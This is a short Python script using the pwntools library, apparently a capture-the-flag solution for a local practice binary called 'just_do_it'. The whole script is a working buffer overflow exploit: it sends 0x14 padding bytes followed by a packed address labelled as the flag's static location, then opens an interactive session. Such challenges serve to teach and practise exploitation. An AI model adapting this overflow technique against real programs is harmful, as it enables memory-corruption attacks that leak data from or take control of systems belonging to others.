from pwn import *


pwn = process("./just_do_it")

buffer = b'A' * 0x14
buffer += p32(0x0804a080) # static address of flag

pwn.sendline(buffer)

pwn.interactive()
